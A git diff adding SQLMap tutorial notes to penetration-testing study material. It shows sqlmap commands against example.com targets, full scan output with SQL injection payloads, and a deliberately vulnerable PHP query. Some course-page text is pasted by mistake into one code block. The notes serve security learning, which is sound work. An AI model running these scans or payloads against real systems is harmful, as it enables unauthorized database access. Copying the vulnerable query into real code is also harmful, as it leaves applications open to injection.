@@ -41,6 +41,19 @@
       - [User Privileges](#user-privileges-1)
       - [Web Application Firewall (WAF)](#web-application-firewall-waf)
       - [Paramterized Queries](#paramterized-queries)
+- [SQLMap](#sqlmap)
+  - [Databases](#databases)
+  - [Supported SQLi Types](#supported-sqli-types)
+  - [Basic Scenario](#basic-scenario)
+  - [SQLMap Output Description](#sqlmap-output-description)
+  - [SQLMap on HTTP Request](#sqlmap-on-http-request)
+    - [CURL Commands](#curl-commands)
+    - [GET/POST Requests](#getpost-requests)
+    - [Full HTTP Requests](#full-http-requests)
+    - [Custom SQLMap Requests](#custom-sqlmap-requests)
+    - [Custom HTTP Requests](#custom-http-requests)
+  - [Handling SQLMap Errors](#handling-sqlmap-errors)
+    - [Display Errors](#display-errors)
 
 ---
 
@@ -781,3 +794,355 @@ Another way to ensure that the input is safely sanitized is by using parameteriz
 ```
 
 The query is modified to contain two placeholders, marked with ```?``` where the username and password will be placed. You then bind the username and password to the query using the ```mysqli_stmt_bind_param()``` function. This will safely escape any quotes and place the values in the query.
+
+# SQLMap
+
+... is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQLi flaws.
+
+```bash
+d41y@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
+
+       ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.3.10.41#dev}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 12:55:56
+
+[12:55:56] [INFO] testing connection to the target URL
+[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[12:55:58] [INFO] testing if the target URL content is stable
+[12:55:58] [INFO] target URL content is stable
+[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
+[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
+[12:55:59] [INFO] GET parameter 'id' is dynamic
+[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
+<...SNIP...>
+```
+
+## Databases
+
+Supported DBMSes are:
+
+- MySQL
+- Oracle
+- PostgreSQL
+- Microsoft
+- SQL Server
+- SQLite
+- IBM DB2
+- Microsoft AccessFirebird
+- Sybase
+- SAP MaxDB
+- Informix
+- MariaDB
+- HSQLDB
+- CockroachDB
+- TiDB
+- MemSQL
+- H2
+- MonetDB
+- Apache Derby
+- Amazon Redshift
+- Vertica, Mckoi
+- Presto
+- Altibase
+- MimerSQL
+- CrateDB
+- Greenplum
+- Drizzle
+- Apache Ignite
+- Cubrid
+- InterSystems
+- Cache
+- IRIS
+- eXtremeDB
+- FrontBase
+
+## Supported SQLi Types
+
+BEUSTQ
+
+- **B**: Boolean-based blind
+- **E**: Error-based
+- **U**: Union query-based
+- **S**: Stacked queries
+- **T**: Time-based blind
+- **Q**: Inline queries
+
+## Basic Scenario
+
+Vulnerable PHP code:
+
+```php
+$link = mysqli_connect($host, $username, $password, $database, 3306);
+$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
+$result = mysqli_query($link, $sql);
+if (!$result)
+    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
+```
+
+As error reporting is enabled for the vulnerbale SQL query, there will be a database error returned as part of the web server response in case of any SQL query execution problems. Such cases ease the process of SQLi detection, especially in case of manual parameter value tampering, as the resulting errors are easily recognized.
+
+![sqlmap1](../../../images/sqlmap1.png)
+
+To run SQLMap against this example, located at the example URL ```http://www.example.com/vuln.php?id=1```, would look like the following:
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.9}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 22:26:45 /2020-09-09/
+
+[22:26:45] [INFO] testing connection to the target URL
+[22:26:45] [INFO] testing if the target URL content is stable
+[22:26:46] [INFO] target URL content is stable
+[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
+[22:26:46] [INFO] GET parameter 'id' appears to be dynamic
+[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:26:46] [WARNING] reflective value(s) found and filtering out
+[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
+[22:26:46] [INFO] testing 'Generic inline queries'
+[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+...SNIP...
+[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
+[22:26:46] [INFO] testing 'MySQL inline queries'
+[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                       
+...SNIP...
+[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[22:26:56] [INFO] target URL appears to have 3 columns in query
+[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8814=8814
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
+---
+[22:26:56] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL >= 5.0
+[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'
+
+[*] ending @ 22:26:57 /2020-09-09/
+```
+
+## SQLMap Output Description
+
+| Log Message Type | Log Message Example | Log Message Explanation |
+| ---------------- | ------------------- | ----------------------- |
+| **URL content is stable** | _"target URL content is stable"_ | there are no major changes between responses in case of continuous identical requests;in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts |
+| **Parameter appears to be dynamic** | _"GET parameter 'id' appears to be dynamic"_ | it is always desired for the tested parameter to be "dynamic", as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database; in case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context |
+| **Parameter might be injectable** | _"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DMBS: 'MySQL')"_ | not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run |
+| **Parameter might be vulnerable to XSS attacks** | _"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"_ | SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability |
+| **Back-end DBMS is '...'** | _"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"_ | in a normal run, SQLMap tests for all supported DBMSes; in case there is a clear indication that the target is using the specific DBMS |
+| **Level/risk values** | _"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]" | if there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests |
+| **Reflective values found** | _"reflective value(s) found and filtering out"_ | just a warning that parts of the used payloads are found in the response |
+| **Parameter appears to be injectable** | _"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --strings="luther")"_ | indicates that the parameter appers to be injectable; though there is still a chance for it to be a false-positive finding |
+| **Time-based comparison statistical mode** | _"time-based comparison requires a larger statistical model, please wait...... (done)"_ | SQLMap uses statistical model for the recognition of regular and (deliberately) delayed target responses |
+| **Extending UNION query injection technique test** | _"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"_ | UNION-query SQLi checks require considerably more requests for successful recognition of usable payload other than other SQLi types |
+| **Technique appears to be usable** | _"'ORDER BY' technique appears to be usable. This should reduce the time needed to finde the right number of query columns. Automatically extending the range for current UNION query injection technique test"_ | as a heuristic check for the UNION-query SQLi type, before the actual UNION payloads are sent, a technique known as ORDER BY is checked for usability |
+| **Parameter is vulnerable** | _"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [Y/n]"_ | means that the parameter was found to be vulnerable to SQLi |
+| **Sqlmap identified injection points** | _"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"_ | following after is a listing of all injection points with type, title, payloads, which represents the final proof of successful detection and exploitation of found SQLi vulns |
+| **Data logged to text files** | _"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"_ | indicates the local file system location used for storing all logs, sessions, and output data for a specific target - in this case, ```www.example.com``` |
+
+## SQLMap on HTTP Request
+
+### CURL Commands
+
+One of the best and easiest ways to properly set up an SQLMap request against a specific target is by utilizing ```Copy as cURL``` feature from within the Network panel inside the Chrome, Edge, or Firefox Developer Tools.
+
+By pasting the clipboard content into the command line, and changing the original command ```curl``` to sqlmap, you are able to use SQLMap with the identical ```curl``` command:
+
+```bash
+d41y@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
+```
+
+When providing data for testing to SQLMap, there has to be either a parameter (_id=..._) value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (_```-crawl```, ```-forms```, ```-g```_).
+
+### GET/POST Requests
+
+In the most common scenario, GET parameters are provided with the usage of option ```-u``` or ```---url```. As for testing POST data, the ```--data```.
+
+```bash
+d41y@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
+```
+
+If you have a clear indication that the parameter ```uid``` is prone to an SQLi vuln, you could narrow down the tests to only this parameter using ```-p uid```. Otherwise, you could mark it inside the provided data with the usage of special marker ```*```.
+
+```bash
+d41y@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+```
+
+### Full HTTP Requests
+
+If you need to specify a complex HTTP request with lots of different header values and an elongated POST body, you can use the ```-r``` flag. With this option, SQLMap is provided with the "request file", containing the whole HTTP request inside a single textual file. You can capture the request within a specialized proxy.
+
+Burp example:
+
+```bash
+GET /?id=1 HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
+If-None-Match: "3147526947"
+Cache-Control: max-age=0
+```
+
+```-r``` flag usage example:
+
+```bash
+d41y@htb[/htb]$ sqlmap -r req.txt
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.9}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 14:32:59 /2020-09-11/
+
+[14:32:59] [INFO] parsing HTTP request from 'req.txt'
+[14:32:59] [INFO] testing connection to the target URL
+[14:32:59] [INFO] testing if the target URL content is stable
+[14:33:00] [INFO] target URL content is stable
+```
+
+### Custom SQLMap Requests
+
+You can craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.
+
+- --cookie
+- -H/--header
+- --host
+- --referer
+- -A/--user-agent
+- --random-agent
+- --mobile
+- --method
+
+### Custom HTTP Requests
+
+SQLMap also supports JSON formatted and XML formatted HTTP requests.
+
+Support for these formats is implemented in a "relaxed" manner; thus, there are no strict constraints on how the parameter values are stored inside.
+
+You can once again use the ```-r``` flag option:
+
+```bash
+d41y@htb[/htb]$ cat req.txt
+HTTP / HTTP/1.0
+Host: www.example.com
+
+{
+  "data": [{
+    "type": "articles",
+    "id": "1",
+    "attributes": {
+      "title": "Example JSON",
+      "body": "Just an example",
+      "created": "2020-05-22T14:56:29.000Z",
+      "updated": "2020-05-22T14:56:28.000Z"
+    },
+    "relationships": {
+      "author": {
+        "data": {"id": "42", "type": "user"}
+      }
+    }
+  }]
+}
+```
+
+```bash
+d41y@htb[/htb]$ sqlmap -r req.txt
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.4.9}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 00:03:44 /2020-09-15/
+
+[00:03:44] [INFO] parsing HTTP request from 'req.txt'
+JSON data found in HTTP body. Do you want to process it? [Y/n/q] 
+[00:03:45] [INFO] testing connection to the target URL
+[00:03:45] [INFO] testing if the target URL content is stable
+[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
+[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
+[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
+
+/ 1 spawns left
+Waiting to start...
+Enable step-by-step solutions for all questions
+sparkles-icon-decoration
+Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): Click here to spawn the target system!
+
++ 1 What's the contents of table flag2? (Case #2)
++ 1 What's the contents of table flag3? (Case #3)
++ 1 What's the contents of table flag4? (Case #4)
+Table of Contents
+Getting Started
+Building Attacks
+Database Enumeration
+Advanced SQLMap Usage
+Skills Assessment
+My Workstation
+
+OFFLINE
+
+/ 1 spawns left
+```
+
+## Handling SQLMap Errors
+
+### Display Errors
+
